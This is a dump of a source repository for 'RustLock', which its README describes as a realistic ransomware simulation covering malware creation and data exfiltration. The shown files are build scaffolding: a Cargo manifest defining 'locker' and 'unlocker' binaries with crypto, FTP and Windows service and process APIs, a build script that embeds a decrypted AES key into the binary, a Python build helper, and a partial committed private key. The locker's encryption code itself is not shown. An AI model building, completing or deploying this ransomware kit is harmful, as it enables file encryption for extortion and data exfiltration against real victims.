================================================
File: README.md
================================================
# Ransomware
A realistic ransomware simulation built with Rust and React—covering malware creation, data exfiltration, and a reactive blog. For educational purposes only… 


================================================
File: RustLock/Cargo.lock
================================================
# This file is automatically @generated by Cargo.
# It is not intended for manual editing.
version = 4

[[package]]
name = "aho-corasick"
version = "1.1.3"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8e60d3430d3a69478ad0993f19238d2df97c507009a52b3c10addcd7f6bcb916"
dependencies = [
 "memchr",
]

[[package]]
name = "android-tzdata"
version = "0.1.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "e999941b234f3131b00bc13c22d06e8c5ff726d1b6318ac7eb276997bbb4fef0"

[[package]]
name = "android_system_properties"
version = "0.1.5"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "819e7219dbd41043ac279b19830f2efc897156490d7fd6ea916720117ee66311"
dependencies = [
 "libc",
]

[[package]]
name = "autocfg"
version = "1.4.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "ace50bade8e6234aa140d9a2f552bbee1db4d353f69b8217bc503490fc1a9f26"

[[package]]
name = "base64"
version = "0.20.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0ea22880d78093b0cbe17c89f64a7d457941e65759157ec6cb31a31d652b05e5"

[[package]]
name = "base64ct"
version = "1.6.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8c3c1a368f70d6cf7302d78f8f7093da241fb8e8807c05cc9e51a125895a6d5b"

[[package]]
name = "block-buffer"
version = "0.10.4"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "3078c7629b62d3f0439517fa394996acacc5cbc91c5a20d8c658e77abd503a71"
dependencies = [
 "generic-array",
]

[[package]]
name = "bumpalo"
version = "3.17.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1628fb46dfa0b37568d12e5edd512553eccf6a22a78e8bde00bb4aed84d5bdbf"

[[package]]
name = "byteorder"
version = "1.5.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1fd0f2584146f6f2ef48085050886acf353beff7305ebd1ae69500e27c67f64b"

[[package]]
name = "cc"
version = "1.2.14"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0c3d1b2e905a3a7b00a6141adb0e4c0bb941d11caf55349d863942a1cc44e3c9"
dependencies = [
 "shlex",
]

[[package]]
name = "cfg-if"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "baf1de4339761588bc0619e3cbc0120ee582ebb74b53b4efbf79117bd2da40fd"

[[package]]
name = "chrono"
version = "0.4.39"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7e36cc9d416881d2e24f9a963be5fb1cd90966419ac844274161d10488b3e825"
dependencies = [
 "android-tzdata",
 "iana-time-zone",
 "num-traits",
 "windows-targets",
]

[[package]]
name = "const-oid"
version = "0.9.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "c2459377285ad874054d797f3ccebf984978aa39129f6eafde5cdc8315b612f8"

[[package]]
name = "core-foundation-sys"
version = "0.8.7"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "773648b94d0e5d620f64f280777445740e61fe701025087ec8b57f45c791888b"

[[package]]
name = "cpufeatures"
version = "0.2.17"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "59ed5838eebb26a2bb2e58f6d5b5316989ae9d08bab10e0e6d103e656d1b0280"
dependencies = [
 "libc",
]

[[package]]
name = "crypto-common"
version = "0.1.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1bfb12502f3fc46cca1bb51ac28df9d618d813cdc3d2f25b9fe775a34af26bb3"
dependencies = [
 "generic-array",
 "typenum",
]

[[package]]
name = "der"
version = "0.7.9"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f55bf8e7b65898637379c1b74eb1551107c8294ed26d855ceb9fd1a09cfc9bc0"
dependencies = [
 "const-oid",
 "pem-rfc7468",
 "zeroize",
]

[[package]]
name = "digest"
version = "0.10.7"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "9ed9a281f7bc9b7576e61468ba615a66a5c8cfdff42420a70aa82701a3b1e292"
dependencies = [
 "block-buffer",
 "const-oid",
 "crypto-common",
]

[[package]]
name = "fastrand"
version = "2.3.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "37909eebbb50d72f9059c3b6d82c0463f2ff062c9e95845c43a6c9c0355411be"

[[package]]
name = "futures-core"
version = "0.3.31"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "05f29059c0c2090612e8d742178b0580d2dc940c837851ad723096f87af6663e"

[[package]]
name = "futures-io"
version = "0.3.31"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "9e5c1b78ca4aae1ac06c48a526a655760685149f0d465d21f37abfe57ce075c6"

[[package]]
name = "futures-lite"
version = "2.6.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f5edaec856126859abb19ed65f39e90fea3a9574b9707f13539acf4abf7eb532"
dependencies = [
 "fastrand",
 "futures-core",
 "futures-io",
 "parking",
 "pin-project-lite",
]

[[package]]
name = "generic-array"
version = "0.14.7"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "85649ca51fd72272d7821adaf274ad91c288277713d9c18820d8499a7ff69e9a"
dependencies = [
 "typenum",
 "version_check",
]

[[package]]
name = "getrandom"
version = "0.2.15"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "c4567c8db10ae91089c99af84c68c38da3ec2f087c3f82960bcdbf3656b6f4d7"
dependencies = [
 "cfg-if",
 "libc",
 "wasi",
]

[[package]]
name = "hex"
version = "0.4.3"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7f24254aa9a54b5c858eaee2f5bccdb46aaf0e486a595ed5fd8f86ba55232a70"

[[package]]
name = "iana-time-zone"
version = "0.1.61"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "235e081f3925a06703c2d0117ea8b91f042756fd6e7a6e5d901e8ca1a996b220"
dependencies = [
 "android_system_properties",
 "core-foundation-sys",
 "iana-time-zone-haiku",
 "js-sys",
 "wasm-bindgen",
 "windows-core",
]

[[package]]
name = "iana-time-zone-haiku"
version = "0.1.2"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f31827a206f56af32e590ba56d5d2d085f558508192593743f16b2306495269f"
dependencies = [
 "cc",
]

[[package]]
name = "js-sys"
version = "0.3.77"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1cfaf33c695fc6e08064efbc1f72ec937429614f25eef83af942d0e227c3a28f"
dependencies = [
 "once_cell",
 "wasm-bindgen",
]

[[package]]
name = "lazy-regex"
version = "3.4.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "60c7310b93682b36b98fa7ea4de998d3463ccbebd94d935d6b48ba5b6ffa7126"
dependencies = [
 "lazy-regex-proc_macros",
 "once_cell",
 "regex",
]

[[package]]
name = "lazy-regex-proc_macros"
version = "3.4.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "4ba01db5ef81e17eb10a5e0f2109d1b3a3e29bac3070fdbd7d156bf7dbd206a1"
dependencies = [
 "proc-macro2",
 "quote",
 "regex",
 "syn",
]

[[package]]
name = "lazy_static"
version = "1.5.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "bbd2bcb4c963f2ddae06a2efc7e9f3591312473c50c6685e1f298068316e66fe"
dependencies = [
 "spin",
]

[[package]]
name = "libc"
version = "0.2.169"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "b5aba8db14291edd000dfcc4d620c7ebfb122c613afb886ca8803fa4e128a20a"

[[package]]
name = "libm"
version = "0.2.11"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8355be11b20d696c8f18f6cc018c4e372165b1fa8126cef092399c9951984ffa"

[[package]]
name = "log"
version = "0.4.25"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "04cbf5b083de1c7e0222a7a51dbfdba1cbe1c6ab0b15e29fff3f6c077fd9cd9f"

[[package]]
name = "memchr"
version = "2.7.4"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "78ca9ab1a0babb1e7d5695e3530886289c18cf2f87ec19a575a0abdce112e3a3"

[[package]]
name = "num-bigint-dig"
version = "0.8.4"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "dc84195820f291c7697304f3cbdadd1cb7199c0efc917ff5eafd71225c136151"
dependencies = [
 "byteorder",
 "lazy_static",
 "libm",
 "num-integer",
 "num-iter",
 "num-traits",
 "rand",
 "smallvec",
 "zeroize",
]

[[package]]
name = "num-integer"
version = "0.1.46"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7969661fd2958a5cb096e56c8e1ad0444ac2bbcd0061bd28660485a44879858f"
dependencies = [
 "num-traits",
]

[[package]]
name = "num-iter"
version = "0.1.45"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1429034a0490724d0075ebb2bc9e875d6503c3cf69e235a8941aa757d83ef5bf"
dependencies = [
 "autocfg",
 "num-integer",
 "num-traits",
]

[[package]]
name = "num-traits"
version = "0.2.19"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "071dfc062690e90b734c0b2273ce72ad0ffa95f0c74596bc250dcfd960262841"
dependencies = [
 "autocfg",
 "libm",
]

[[package]]
name = "once_cell"
version = "1.20.3"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "945462a4b81e43c4e3ba96bd7b49d834c6f61198356aa858733bc4acf3cbe62e"

[[package]]
name = "parking"
version = "2.2.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f38d5652c16fde515bb1ecef450ab0f6a219d619a7274976324d5e377f7dceba"

[[package]]
name = "passwords"
version = "3.1.16"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "11407193a7c2bd14ec6b0ec3394da6fdcf7a4d5dcbc8c3cc38dfb17802c8d59c"
dependencies = [
 "random-pick",
]

[[package]]
name = "pem-rfc7468"
version = "0.7.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "88b39c9bfcfc231068454382784bb460aae594343fb030d46e9f50a645418412"
dependencies = [
 "base64ct",
]

[[package]]
name = "pin-project-lite"
version = "0.2.16"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "3b3cff922bd51709b605d9ead9aa71031d81447142d828eb4a6eba76fe619f9b"

[[package]]
name = "pkcs1"
version = "0.7.5"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "c8ffb9f10fa047879315e6625af03c164b16962a5368d724ed16323b68ace47f"
dependencies = [
 "der",
 "pkcs8",
 "spki",
]

[[package]]
name = "pkcs8"
version = "0.10.2"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f950b2377845cebe5cf8b5165cb3cc1a5e0fa5cfa3e1f7f55707d8fd82e0a7b7"
dependencies = [
 "der",
 "spki",
]

[[package]]
name = "ppv-lite86"
version = "0.2.20"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "77957b295656769bb8ad2b6a6b09d897d94f05c41b069aede1fcdaa675eaea04"
dependencies = [
 "zerocopy",
]

[[package]]
name = "proc-macro-hack"
version = "0.5.20+deprecated"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "dc375e1527247fe1a97d8b7156678dfe7c1af2fc075c9a4db3690ecd2a148068"

[[package]]
name = "proc-macro2"
version = "1.0.93"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "60946a68e5f9d28b0dc1c21bb8a97ee7d018a8b322fa57838ba31cc878e22d99"
dependencies = [
 "unicode-ident",
]

[[package]]
name = "quote"
version = "1.0.38"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0e4dccaaaf89514f546c693ddc140f729f958c247918a13380cccc6078391acc"
dependencies = [
 "proc-macro2",
]

[[package]]
name = "rand"
version = "0.8.5"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "34af8d1a0e25924bc5b7c43c079c942339d8f0a8b57c39049bef581b46327404"
dependencies = [
 "libc",
 "rand_chacha",
 "rand_core",
]

[[package]]
name = "rand_chacha"
version = "0.3.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "e6c10a63a0fa32252be49d21e7709d4d4baf8d231c2dbce1eaa8141b9b127d88"
dependencies = [
 "ppv-lite86",
 "rand_core",
]

[[package]]
name = "rand_core"
version = "0.6.4"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "ec0be4795e2f6a28069bec0b5ff3e2ac9bafc99e6a9a7dc3547996c5c816922c"
dependencies = [
 "getrandom",
]

[[package]]
name = "random-number"
version = "0.1.9"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7fc8cdd49be664772ffc3dbfa743bb8c34b78f9cc6a9f50e56ae878546796067"
dependencies = [
 "proc-macro-hack",
 "rand",
 "random-number-macro-impl",
]

[[package]]
name = "random-number-macro-impl"
version = "0.1.8"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f5135143cb48d14289139e4615bffec0d59b4cbfd4ea2398a3770bd2abfc4aa2"
dependencies = [
 "proc-macro-hack",
 "quote",
 "syn",
]

[[package]]
name = "random-pick"
version = "1.2.16"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "c179499072da789afe44127d5f4aa6012de2c2f96ef759990196b37387a2a0f8"
dependencies = [
 "random-number",
]

[[package]]
name = "regex"
version = "1.11.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "b544ef1b4eac5dc2db33ea63606ae9ffcfac26c1416a2806ae0bf5f56b201191"
dependencies = [
 "aho-corasick",
 "memchr",
 "regex-automata",
 "regex-syntax",
]

[[package]]
name = "regex-automata"
version = "0.4.9"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "809e8dc61f6de73b46c85f4c96486310fe304c434cfa43669d7b40f711150908"
dependencies = [
 "aho-corasick",
 "memchr",
 "regex-syntax",
]

[[package]]
name = "regex-syntax"
version = "0.8.5"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "2b15c43186be67a4fd63bee50d0303afffcef381492ebe2c5d87f324e1b8815c"

[[package]]
name = "ring"
version = "0.17.9"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "e75ec5e92c4d8aede845126adc388046234541629e76029599ed35a003c7ed24"
dependencies = [
 "cc",
 "cfg-if",
 "getrandom",
 "libc",
 "untrusted",
 "windows-sys",
]

[[package]]
name = "rsa"
version = "0.9.7"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "47c75d7c5c6b673e58bf54d8544a9f432e3a925b0e80f7cd3602ab5c50c55519"
dependencies = [
 "const-oid",
 "digest",
 "num-bigint-dig",
 "num-integer",
 "num-traits",
 "pkcs1",
 "pkcs8",
 "rand_core",
 "signature",
 "spki",
 "subtle",
 "zeroize",
]

[[package]]
name = "rustlock"
version = "1.0.0"
dependencies = [
 "base64",
 "digest",
 "hex",
 "passwords",
 "rand",
 "rand_core",
 "ring",
 "rsa",
 "sha2",
 "suppaftp",
 "widestring",
 "winapi",
]

[[package]]
name = "rustversion"
version = "1.0.19"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "f7c45b9784283f1b2e7fb61b42047c2fd678ef0960d4f6f1eba131594cc369d4"

[[package]]
name = "sha2"
version = "0.10.8"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "793db75ad2bcafc3ffa7c68b215fee268f537982cd901d132f89c6343f3a3dc8"
dependencies = [
 "cfg-if",
 "cpufeatures",
 "digest",
]

[[package]]
name = "shlex"
version = "1.3.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0fda2ff0d084019ba4d7c6f371c95d8fd75ce3524c3cb8fb653a3023f6323e64"

[[package]]
name = "signature"
version = "2.2.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "77549399552de45a898a580c1b41d445bf730df867cc44e6c0233bbc4b8329de"
dependencies = [
 "digest",
 "rand_core",
]

[[package]]
name = "smallvec"
version = "1.14.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7fcf8323ef1faaee30a44a340193b1ac6814fd9b7b4e88e9d4519a3e4abe1cfd"

[[package]]
name = "spin"
version = "0.9.8"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "6980e8d7511241f8acf4aebddbb1ff938df5eebe98691418c4468d0b72a96a67"

[[package]]
name = "spki"
version = "0.7.3"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "d91ed6c858b01f942cd56b37a94b3e0a1798290327d1236e4d9cf4eaca44d29d"
dependencies = [
 "base64ct",
 "der",
]

[[package]]
name = "subtle"
version = "2.6.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "13c2bddecc57b384dee18652358fb23172facb8a2c51ccc10d74c157bdea3292"

[[package]]
name = "suppaftp"
version = "6.0.7"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "821742c6eeb5a90b95566abae78cc4bab5b96d9c230d29ea9e1a2e3181e57885"
dependencies = [
 "chrono",
 "futures-lite",
 "lazy-regex",
 "log",
 "thiserror",
]

[[package]]
name = "syn"
version = "2.0.98"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "36147f1a48ae0ec2b5b3bc5b537d267457555a10dc06f3dbc8cb11ba3006d3b1"
dependencies = [
 "proc-macro2",
 "quote",
 "unicode-ident",
]

[[package]]
name = "thiserror"
version = "2.0.11"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "d452f284b73e6d76dd36758a0c8684b1d5be31f92b89d07fd5822175732206fc"
dependencies = [
 "thiserror-impl",
]

[[package]]
name = "thiserror-impl"
version = "2.0.11"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "26afc1baea8a989337eeb52b6e72a039780ce45c3edfcc9c5b9d112feeb173c2"
dependencies = [
 "proc-macro2",
 "quote",
 "syn",
]

[[package]]
name = "typenum"
version = "1.17.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "42ff0bf0c66b8238c6f3b578df37d0b7848e55df8577b3f74f92a69acceeb825"

[[package]]
name = "unicode-ident"
version = "1.0.16"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "a210d160f08b701c8721ba1c726c11662f877ea6b7094007e1ca9a1041945034"

[[package]]
name = "untrusted"
version = "0.9.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8ecb6da28b8a351d773b68d5825ac39017e680750f980f3a1a85cd8dd28a47c1"

[[package]]
name = "version_check"
version = "0.9.5"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0b928f33d975fc6ad9f86c8f283853ad26bdd5b10b7f1542aa2fa15e2289105a"

[[package]]
name = "wasi"
version = "0.11.0+wasi-snapshot-preview1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "9c8d87e72b64a3b4db28d11ce29237c246188f4f51057d65a7eab63b7987e423"

[[package]]
name = "wasm-bindgen"
version = "0.2.100"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1edc8929d7499fc4e8f0be2262a241556cfc54a0bea223790e71446f2aab1ef5"
dependencies = [
 "cfg-if",
 "once_cell",
 "rustversion",
 "wasm-bindgen-macro",
]

[[package]]
name = "wasm-bindgen-backend"
version = "0.2.100"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "2f0a0651a5c2bc21487bde11ee802ccaf4c51935d0d3d42a6101f98161700bc6"
dependencies = [
 "bumpalo",
 "log",
 "proc-macro2",
 "quote",
 "syn",
 "wasm-bindgen-shared",
]

[[package]]
name = "wasm-bindgen-macro"
version = "0.2.100"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7fe63fc6d09ed3792bd0897b314f53de8e16568c2b3f7982f468c0bf9bd0b407"
dependencies = [
 "quote",
 "wasm-bindgen-macro-support",
]

[[package]]
name = "wasm-bindgen-macro-support"
version = "0.2.100"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8ae87ea40c9f689fc23f209965b6fb8a99ad69aeeb0231408be24920604395de"
dependencies = [
 "proc-macro2",
 "quote",
 "syn",
 "wasm-bindgen-backend",
 "wasm-bindgen-shared",
]

[[package]]
name = "wasm-bindgen-shared"
version = "0.2.100"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1a05d73b933a847d6cccdda8f838a22ff101ad9bf93e33684f39c1f5f0eece3d"
dependencies = [
 "unicode-ident",
]

[[package]]
name = "widestring"
version = "1.1.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "7219d36b6eac893fa81e84ebe06485e7dcbb616177469b142df14f1f4deb1311"

[[package]]
name = "winapi"
version = "0.3.9"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "5c839a674fcd7a98952e593242ea400abe93992746761e38641405d28b00f419"
dependencies = [
 "winapi-i686-pc-windows-gnu",
 "winapi-x86_64-pc-windows-gnu",
]

[[package]]
name = "winapi-i686-pc-windows-gnu"
version = "0.4.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "ac3b87c63620426dd9b991e5ce0329eff545bccbbb34f3be09ff6fb6ab51b7b6"

[[package]]
name = "winapi-x86_64-pc-windows-gnu"
version = "0.4.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "712e227841d057c1ee1cd2fb22fa7e5a5461ae8e48fa2ca79ec42cfc1931183f"

[[package]]
name = "windows-core"
version = "0.52.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "33ab640c8d7e35bf8ba19b884ba838ceb4fba93a4e8c65a9059d08afcfc683d9"
dependencies = [
 "windows-targets",
]

[[package]]
name = "windows-sys"
version = "0.52.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "282be5f36a8ce781fad8c8ae18fa3f9beff57ec1b52cb3de0789201425d9a33d"
dependencies = [
 "windows-targets",
]

[[package]]
name = "windows-targets"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "9b724f72796e036ab90c1021d4780d4d3d648aca59e491e6b98e725b84e99973"
dependencies = [
 "windows_aarch64_gnullvm",
 "windows_aarch64_msvc",
 "windows_i686_gnu",
 "windows_i686_gnullvm",
 "windows_i686_msvc",
 "windows_x86_64_gnu",
 "windows_x86_64_gnullvm",
 "windows_x86_64_msvc",
]

[[package]]
name = "windows_aarch64_gnullvm"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "32a4622180e7a0ec044bb555404c800bc9fd9ec262ec147edd5989ccd0c02cd3"

[[package]]
name = "windows_aarch64_msvc"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "09ec2a7bb152e2252b53fa7803150007879548bc709c039df7627cabbd05d469"

[[package]]
name = "windows_i686_gnu"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "8e9b5ad5ab802e97eb8e295ac6720e509ee4c243f69d781394014ebfe8bbfa0b"

[[package]]
name = "windows_i686_gnullvm"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "0eee52d38c090b3caa76c563b86c3a4bd71ef1a819287c19d586d7334ae8ed66"

[[package]]
name = "windows_i686_msvc"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "240948bc05c5e7c6dabba28bf89d89ffce3e303022809e73deaefe4f6ec56c66"

[[package]]
name = "windows_x86_64_gnu"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "147a5c80aabfbf0c7d901cb5895d1de30ef2907eb21fbbab29ca94c5b08b1a78"

[[package]]
name = "windows_x86_64_gnullvm"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "24d5b23dc417412679681396f2b49f3de8c1473deb516bd34410872eff51ed0d"

[[package]]
name = "windows_x86_64_msvc"
version = "0.52.6"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "589f6da84c646204747d1270a2a5661ea66ed1cced2631d546fdfb155959f9ec"

[[package]]
name = "zerocopy"
version = "0.7.35"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "1b9b4fd18abc82b8136838da5d50bae7bdea537c574d8dc1a34ed098d6c166f0"
dependencies = [
 "byteorder",
 "zerocopy-derive",
]

[[package]]
name = "zerocopy-derive"
version = "0.7.35"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "fa4f8080344d4671fb4e831a13ad1e68092748387dfc4f55e356242fae12ce3e"
dependencies = [
 "proc-macro2",
 "quote",
 "syn",
]

[[package]]
name = "zeroize"
version = "1.8.1"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "ced3678a2879b30306d323f4542626697a464a97c0a07c9aebf7ebca65cd4dde"


================================================
File: RustLock/Cargo.toml
================================================
[package]
name = "rustlock"
version = "1.0.0"
edition = "2021"
build = "build.rs"

[profile.release]
lto = true

[[bin]]
name = "locker"
path = "src/locker.rs"

[[bin]]
name = "unlocker"
path = "src/unlocker.rs"

[dependencies]
rsa = "0.9"
rand = "0.8"
rand_core="0.6.4"
sha2 = "0.10"
digest = "0.10.7"
ring = "0.17" 
hex = "0.4"
passwords = "3.1.16"
base64 = "0.20.0"
suppaftp = "6.0.7"

[build-dependencies]
rsa = "0.9"
base64 = "0.20.0"
hex = "0.4"
rand = "0.8"
rand_core="0.6.4"
sha2 = "0.10"


[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = ["shellapi","securitybaseapi", "winbase", "winerror", "fileapi", "errhandlingapi", "wincrypt", "handleapi", "minwindef", "winnt", "processthreadsapi", "debugapi", "sysinfoapi", "winuser", "minwinbase", "synchapi", "windef", "psapi", "winsvc"]}
widestring = "*"







================================================
File: RustLock/build.rs
================================================
use std::env;
use std::error::Error;
use std::fs;

use rsa::RsaPrivateKey;
// To parse a private key in PKCS#8 format (header "-----BEGIN PRIVATE KEY-----")
use rsa::pkcs8::DecodePrivateKey;
// Import OAEP padding and SHA256 digest type
use base64;
use rsa::Oaep;
use sha2::Sha256;

/// Decrypts an AES key using an RSA private key.
///
/// # Arguments
/// - `encrypted_aes_key` - The AES key encrypted with an RSA public key.
/// - `private_key_pem` - The RSA private key in PEM format.
///
/// # Returns
/// - A byte vector containing the decrypted AES key.
fn decrypt_key(encrypted_aes_key: Vec<u8>, private_key_pem: &str) -> Vec<u8> {
    let private_key =
        RsaPrivateKey::from_pkcs8_pem(private_key_pem).expect("Error parsing the private key");

    // Configure OAEP padding scheme with SHA256, the same as used in encryption.
    let padding = Oaep::new::<Sha256>();

    // Decrypt the AES key using the private RSA key and the padding scheme.
    let aes_key = private_key
        .decrypt(padding, &encrypted_aes_key)
        .expect("Error decrypting the AES key");

    return aes_key;
}

fn main() -> Result<(), Box<dyn Error>> {
    // Retrieve the private key path and the base64-encoded AES key from environment variables.
    let rsa_private_key_path = env::var("RSA_PRIV_KEY").expect(
        "Define the RSA_PRIV_KEY environment variable with the path to the private key file",
    );
    let aes_key_base64 = env::var("AES_KEY_B64")
        .expect("Define the AES_KEY_B64 environment variable with the base64-encoded string");

    // Read the private key content.
    let private_key_pem =
        fs::read_to_string(&rsa_private_key_path).expect("Error reading the private key file");

    // Decode the base64-encoded AES key.
    let encrypted_aes_key = base64::decode(aes_key_base64).unwrap();

    // Decrypt the AES key.
    let decrypted_aes_key = decrypt_key(encrypted_aes_key, &private_key_pem);

    // Encode the decrypted AES key back into base64 format.
    let aes_key_plain_base64 = base64::encode(decrypted_aes_key);

    // Inject the AES key into the binary through a build-time environment variable.
    println!("cargo:rerun-if-env-changed=AES_KEY_B64");
    println!("cargo:rerun-if-env-changed=RSA_PRIV_KEY");
    println!("cargo:rustc-env=AES_KEY={}", aes_key_plain_base64);

    return Ok(());
}


================================================
File: RustLock/compile.py
================================================
# Easy script for set env vars and compile the `unlocker`
import os
import sys

VAR_RSA = "RSA_PRIV_KEY"
VAR_AES = "AES_KEY_B64"

PRIV_KEY_PATH = "keys/private_key.pem"
dummydata = "iRYwAJlrf+J1/DRa5kdpGpbNTge9YIrgA38hQhJIeXeyYaSJPvhyvUwOZUTpbpHdD6T8XieyMdFrP5COXmU/DY5JMXChrGwOLvKj5VDp9dEWVuVEoA7ZAcBAVs7/qbfPWaFXjGaS78EVP1k6qQr3USUmRCZ8jUVP/FY3zRDD9GoSzR33R6P/9u1SMpo2W3c350/0Fr8W/LBA0c2xfBWovY6S+xmJiPLv+ywySOk27NSUH4yODcFPrvR4P3BHGSrwHykD7Zuypi5bTg6ZfNI3JL2FwzdEJB1Rc7a3j2SlzRw4qiTUWihhG6iFEWc6b0672lBcBDwpufkgXE/R9L03gA=="

DEBUG = False
EXEC = False

if len(sys.argv) > 1:
    release = "" if DEBUG else "--release"
    ejec = "run" if EXEC else "build"

    os.environ[VAR_RSA] = PRIV_KEY_PATH
    if sys.argv[1].startswith("test"):
        os.environ[VAR_AES] = dummydata
        os.system(f"cargo test -- --nocapture")
    elif sys.argv[1].startswith("lock"):
        os.environ[VAR_AES] = dummydata
        os.system(f"cargo {ejec} {release} --bin locker")
    elif sys.argv[1].startswith("unlock"):
        aes_key_b64 = input("The encrypt AES with RSA in b64 (generated on execute) : ")
        os.environ[VAR_AES] = aes_key_b64  
        os.system(f"cargo {ejec} {release} --bin unlocker")

================================================
File: RustLock/.gitignore
================================================
target/

================================================
File: RustLock/keys/private_key.pem
================================================
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCWCD1UOFtrDA1F
pR2KIWwFsdo1i9w2Y1tpmRBy4f+hSrmxAv9YkXyhrSh2kU3Em9MzO7/4jhC+QCRa
